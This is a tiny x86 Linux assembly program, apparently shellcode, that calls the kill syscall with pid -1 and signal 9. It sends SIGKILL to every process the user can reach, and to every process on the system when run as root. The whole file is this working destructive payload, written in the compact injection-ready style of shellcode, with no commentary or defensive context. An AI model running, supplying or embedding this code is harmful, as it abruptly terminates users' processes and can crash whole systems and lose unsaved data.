global _start

section .text

_start:

	push byte +0x25
	pop eax
	push byte -0x1
	pop ebx
	push byte +0x9
	pop ecx
	int 0x80
